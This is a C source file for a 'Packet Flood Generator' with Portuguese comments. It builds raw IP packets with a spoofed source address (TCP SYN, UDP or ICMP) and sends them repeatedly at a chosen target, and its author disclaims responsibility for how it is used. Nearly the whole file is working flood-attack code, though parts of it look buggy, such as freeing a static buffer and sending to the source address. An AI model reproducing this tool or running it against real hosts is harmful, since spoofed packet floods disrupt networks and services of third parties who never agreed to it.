/*

$Id$

PFG (Packet Flood Generator)
Escrito por mmr (mmr@b1n.org)

--== ATENCAO ==--
Nao me responsabilizo por qualquer finalidade que voce atribua a esse programa.

Compilei e executei com sucesso em OpenBSD.
Provavelmente funciona bem em outros BSD 'flavors' mas nao garanto nada.

Instrucoes para compilacao:
cc -O3 -pipe pfg.c -o pfg

*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>                                                                             
#include <signal.h>
#include <libgen.h>


/* Constantes */
#define IPVERSION   4
#define ICMPTYPE    ICMP_PARAMPROB 
#define ICMPCODE    ICMP_PARAMPROB_OPTABSENT
#define ICMPSIZE    30

#define OK          0          
#define FALHA       -1

/* Prototipos */
unsigned short in_cksum( unsigned short *, int );
void build_tcp(  char *, u_short , u_short, u_char, char * ); 
void build_icmp( char *, u_char *, u_char *);
void build_udp(  char *, u_short , u_short );
void programa_sinais( void );
void uso( char * );     
void sai( void );

/* Vars Globais */

/* TODO: o cabecalho icmp (48 bytes) eh o maior de todos */
//unsigned char packet[ sizeof( struct ip ) + sizeof( struct udphdr ) + sizeof( struct tcphdr ) + sizeof( struct icmp ) ];
unsigned char packet[ sizeof( struct ip ) + sizeof( struct icmp ) ];

int transportlen;
int sent;
struct ip       *iphdr;
struct udphdr   *udp;
struct tcphdr   *tcp;
struct icmp     *icmphdr;
u_char *data;
u_char *icmptype;
u_char *icmpcode;
u_char tcpflags;
u_short dest_port;
u_short src_port;    

/* Structs */
struct dado
{
    char *host_origem;
    char *host_destino;
    char *protocolo;
    int  porta_origem;
    int  porta_destino;
    int  icmp_codigo;
    int  icmp_tipo;
};
    
int
main( int argc, char **argv )
{
    struct dado *txt;                   /* Infor pro cara no final  */
    struct sockaddr_in mysock;          /* Socket                   */
    extern char *optarg;
    extern int optind, opterr, optopt;
    char *protocol = "tcp";
    char *nome_prg = ( char * )basename( argv[ 0 ] );
    int on = 1;                     
    int dasock;
    int repeat = 666;                   /* Pacotes a serem enviados */
    int ip_proto = IPPROTO_TCP;         /* Protocolo IP             */
    int p_len = 0;                      /* Tamanho do Pacote        */
    int i = 0;                          /* Contador                 */
    int c = 0;                          /* Usado no getopt          */
    int v = 1;                          /* Modo verboso             */
    unsigned long bytes_enviados = 0;   /* Contagem de bytes        */
    char ch;                            /* Usado no "ASCIIcoptero"  */
    socklen_t s_len=0;                  /* Tamanho do socket        */

    /* Precisa ser root pra criar raw sockets */
    if( getuid( ) != 0 && geteuid( ) != 0 )
    {
        printf( 
            "\n\033[31mPoor human..."
            "\n\"Bring your daughter... bring your daugther to the slaughter...\"\033[0m\n"
        );
        sai( );
    }

    /* Pelo menos 2 parametros precisam ser passados ( isso precisa ser melhorado ) */
    if( argc < 3 )
        uso( nome_prg );

    txt = ( struct dado* ) malloc( sizeof( struct dado ) );
    bzero( txt, sizeof( struct dado ) );
    
    iphdr = ( struct ip* ) packet;
    bzero( iphdr, sizeof( struct ip ) );        

    icmptype = ( u_char* ) malloc( ICMPSIZE );
    bzero( icmptype, ICMPSIZE );

    icmpcode = ( u_char* ) malloc( ICMPSIZE );
    bzero( icmpcode, ICMPSIZE );

    if( ( dasock = socket( AF_INET, SOCK_RAW, IPPROTO_RAW ) ) < 0 )
    { 
        perror( "socket" );
        return( FALHA );
    }
    
    if( setsockopt( dasock, IPPROTO_IP, IP_HDRINCL, ( char * ) &on, sizeof( on ) ) < 0 )
    {
        perror( "setsockopt" );
        return( FALHA );
    }

    while( ( c = getopt( argc, argv, "p:qh:S:r:d:s:t:c:" ) ) != -1 )
    {
        switch( c )
        {
        case 'p':   /* Protocolo        */
            protocol = ( char * ) optarg;
            break;
        case 's':   /* Host Origem      */
            iphdr->ip_src.s_addr = inet_addr( optarg );
            txt->host_origem = ( char * ) optarg;
            break;
        case 'h':   /* Host Destino     */
            iphdr->ip_dst.s_addr = inet_addr( optarg );
            txt->host_destino = ( char * ) optarg;
            break;
        case 'S':   /* Porta Origem     */
            src_port = ( u_short ) atoi( optarg );
            txt->porta_origem = atoi( optarg );
            break;
        case 'd':   /* Porta Destino    */
            dest_port = ( u_short ) atoi( optarg );
            txt->porta_destino = atoi( optarg );
            break;
        case 'r':   /* Qtde de Pacotes  */
              repeat = atoi( optarg );
              break;
        case 'q':   /* Quiet Mode */
            v = 0;
            break;
//        case 't':   /* Tipo de ICMP     */
//            strncpy( icmptype, optarg, strlen( optarg ) );
//            txt->icmp_tipo = ( int ) icmptype;
//            break;
//        case 'c':   /* Codigo de ICMP   */
//            strncpy( icmpcode , optarg, strlen( optarg ) );
//            txt->icmp_codigo = ( int ) icmpcode;
//            break;
        default:    /* Opcao invalida   */
            uso( nome_prg );
        }
    }
    argc -= optind;
    argv += optind;

    /*
     * Consistencias
     */

    if( ! txt->host_origem || ! txt->host_origem )
        uso( nome_prg );

        
    /*
     * Constroi o pacote IP
     */

    if( protocol[ 0 ] == 'i' )
    {
        txt->protocolo = "ICMP";
        transportlen = sizeof( struct icmp );
        ip_proto = IPPROTO_ICMP;
        build_icmp( (char *) &packet, icmptype, icmpcode );

        free( icmptype );
        free( icmpcode );
    }
    else if( protocol[ 0 ] == 't' )
    {
        txt->protocolo = "TCP";
        transportlen = sizeof( struct tcphdr );
        ip_proto = IPPROTO_TCP;
        build_tcp( (char *) &packet, dest_port, src_port, TH_SYN, "..." );
    }
    else if( protocol[ 0 ] == 'u' )
    {
        txt->protocolo = "UDP";
        transportlen = sizeof( struct udphdr );
        ip_proto = IPPROTO_UDP;
        build_udp( (char *) &packet, dest_port, src_port );
    }
    else
    {
        printf( "Protocolo desconhecido\nAbortando...\n" );
        return( FALHA );
    }    

    iphdr->ip_hl = 5;
    iphdr->ip_v = IPVERSION;

    iphdr->ip_len = htons( ( sizeof( struct ip ) + transportlen ) );
    iphdr->ip_id = htons( getpid( ) );
    iphdr->ip_ttl = 60;
    iphdr->ip_p   = ip_proto;
    iphdr->ip_sum = 0;
    iphdr->ip_sum = ( u_short ) in_cksum( ( unsigned short * ) iphdr, sizeof( struct ip ) );

    /*
     *  struct sockaddr_in .
     */
    memset( &mysock, '\0', sizeof( mysock ) );
    mysock.sin_family = AF_INET;
    mysock.sin_addr.s_addr = iphdr->ip_src.s_addr;

    free( iphdr );

    /*
     * Manda o pacote p. rede
     */
    p_len = sizeof( packet );
    s_len = ( socklen_t ) sizeof( struct sockaddr_in );
    programa_sinais( );

    if( v == 1 )
    {
        printf( 
            "\033[2J\033[1;1H\033[1;33mPacket Flood Generator\n"
            "\033[0;36m----------------------\n"
            "\033[0;32mProtocolo:          \033[1;32m%s\n"
            "\033[0;32mHost Origem:        \033[1;32m%s\n"
            "\033[0;32mHost Destino:       \033[1;32m%s\n",
            txt->protocolo,
            txt->host_origem,
            txt->host_destino
        );

        if( protocol[ 0 ] == 't' || protocol[ 0 ] == 'u' )
        {
            printf( 
                "\033[0;32mPorta Origem:       \033[1;32m%d\n"
                "\033[0;32mPorta Destino:      \033[1;32m%d\n",
                txt->porta_origem,
                txt->porta_destino
            );
        }
        else
        {
            printf(
                "\033[0;32mICMP Tipo:          \033[1;32m%d\n"
                "\033[0;32mICMP Codigo:        \033[1;32m%d\n",
                txt->icmp_tipo,
                txt->icmp_codigo
            );
        }

        printf(
            "\033[0;36m----------------------\n"
            "\033[0;32mPacotes:            \033[1;32m%d\n"
            "\033[0;32mTamanho do Pacote : \033[1;32m%d bytes\n"
            "\033[0;32mBytes a Enviar:     \033[1;32m( %d * %d = %ld bytes ) \n",
            repeat,
            p_len,
            repeat,
            p_len,
            (long) repeat * p_len
        );

        printf( "\033[0;36m----------------------\n" );
            
        while( repeat-- )
        {
            sent = sendto( dasock, &packet, p_len, 0, ( struct sockaddr * ) &mysock, s_len );
            if( sent < 0 )
            {
                perror( "sendto" );
                return( FALHA );
            }
            else
            {
                bytes_enviados += sent;

                switch( ( int ) i % 4 )
                {
                case 0:
                    ch = '|';
                    break;
                case 1:
                    ch = '/';
                    break;
                case 2:
                    ch = '-';
                    break;
                case 3:
                    ch = '\\';
                    break;
                }

                printf(
                    "\n\033[14;1H\033[2K"
                    "\033[1;30mBytes Enviados: \033[0;34m%ld "
                    "\033[0;36m[ \033[1;36m%c\033[0;36m ]\033[0m\n\n",
                    bytes_enviados,
                    ch
                );
                i++;

                usleep( 100 );
            }
        }
    }
    else
    {
        while( repeat-- )
        {
            sent = sendto( dasock, &packet, p_len, 0, ( struct sockaddr * ) &mysock, s_len );
            if( sent < 0 )
            {
                perror( "sendto" );
                exit( FALHA );
            }
            else
                usleep( 100 );
        }
    }
    
    free( txt );

    sai( );
    return( OK );
}

/*
 * trap signals
 */
void
programa_sinais( void )
{
    signal( SIGHUP,  NULL );
    signal( SIGINT,  (void *) sai );
    signal( SIGTERM, (void *) sai );
    signal( SIGKILL, NULL );
    signal( SIGSTOP, NULL );
    signal( SIGTSTP, NULL );
    signal( SIGTTIN, NULL );
    signal( SIGTTOU, NULL );
    signal( SIGXCPU, NULL );
    signal( SIGXFSZ, NULL );
    signal( SIGPROF, NULL );
    signal( SIGPROF, NULL );
    signal( SIGUSR1, NULL );
    signal( SIGUSR2, NULL );
    signal( SIGVTALRM, NULL );   
}


/*
 * in_cksum --
 *      Checksum routine for Internet Protocol family headers ( C Version )
 */
unsigned short
in_cksum( unsigned short *addr, int len )
{
    register int sum = 0;
    register u_short *w = addr;
    register int nleft = len;
    u_short answer = 0;

    /*
     * Our algorithm is simple, using a 32 bit accumulator ( sum ) , we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while ( nleft > 1 )
    {
        sum += *w++;
        nleft -= 2;
    }

    /* mop up an odd byte, if necessary */
    if ( nleft == 1 )
    {
        *( u_char * ) ( &answer ) = *( u_char * ) w ;
        sum += answer;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = ( sum >> 16 ) + ( sum & 0xffff );     /* add hi 16 to low 16 */
    sum += ( sum >> 16 );                     /* add carry */
    answer = ~sum;                          /* truncate to 16 bits */
    return( answer );
}

void
uso( char *nome )
{
    fprintf(
        stderr,
        "\n\033[1;33mPacket Flood Generator"
        "\n----------------------\033[0m"
        "\nUso:"
        "\n%s [-q] -h host_destino -s host_origem -p [t]cp|[u]dp -S porta_origem -d porta_destino"
        "\n%s [-q] -h host_destino -s host_origem -p [i]cmp -t tipo_icmp] -c codigo_icmp" 
        "\n-q = Modo Silencioso (quiet)\n\n",
        nome, nome ); 

    exit( FALHA );
} 

void
build_icmp( char *packet, u_char *type, u_char *code )
{
    icmphdr = ( struct icmp * )( packet + sizeof( struct ip ) );
    memset( icmphdr, '\0', sizeof( struct icmp ) );
    icmphdr->icmp_type = *type;
    icmphdr->icmp_code = *code;
    icmphdr->icmp_seq = getpid( );
    icmphdr->icmp_id = getpid( );
    icmphdr->icmp_cksum = in_cksum( ( unsigned short * )icmphdr, sizeof( struct icmp ) );
}

void
build_udp( char *packet, u_short dest_port, u_short src_port )
{
    udp = ( struct udphdr * )( packet + sizeof( struct ip ) ); 
    memset( udp, '\0', sizeof( struct udphdr ) );
    udp->uh_sport = htons( src_port );
    udp->uh_dport = htons( dest_port );
    udp->uh_ulen  = ( u_short )htons( ( sizeof( struct ip ) + sizeof( struct udphdr ) ) );
    udp->uh_sum   = 0;
    udp->uh_sum   = in_cksum( ( unsigned short* )udp, sizeof( struct udphdr ) );
}
     
void
build_tcp( char *packet, u_short dest_port, u_short src_port, u_char tcpflags, char *data ) 
{
    unsigned long seq;
    unsigned long ack;

    srand( time( NULL ) );
    seq = rand( ) % time( NULL );
    ack = rand( ) % time( NULL );
    
    tcp = ( struct tcphdr* )( packet + sizeof( struct ip ) );
    memset( tcp, 0, sizeof( struct tcphdr ) );
    tcp->th_sport = htons( src_port );
    tcp->th_dport = htons( dest_port );
    tcp->th_seq   = htonl( seq );
    tcp->th_ack   = htonl( ack );
    tcp->th_flags = htonl( tcpflags );
    tcp->th_win   = htons( TCP_MAXWIN );
}

void
sai( void )
{
    printf(
        "\n\033[1;33mPacket Flood Generator"
        "\n\033[0;33m----------------------"
        "\n\033[0;31mmmr <\033[1;31mmmr\033[0;31m@\033[1;31mb1n.org\033[0;31m>\033[0m\n\n"
    );

    exit( OK );
}
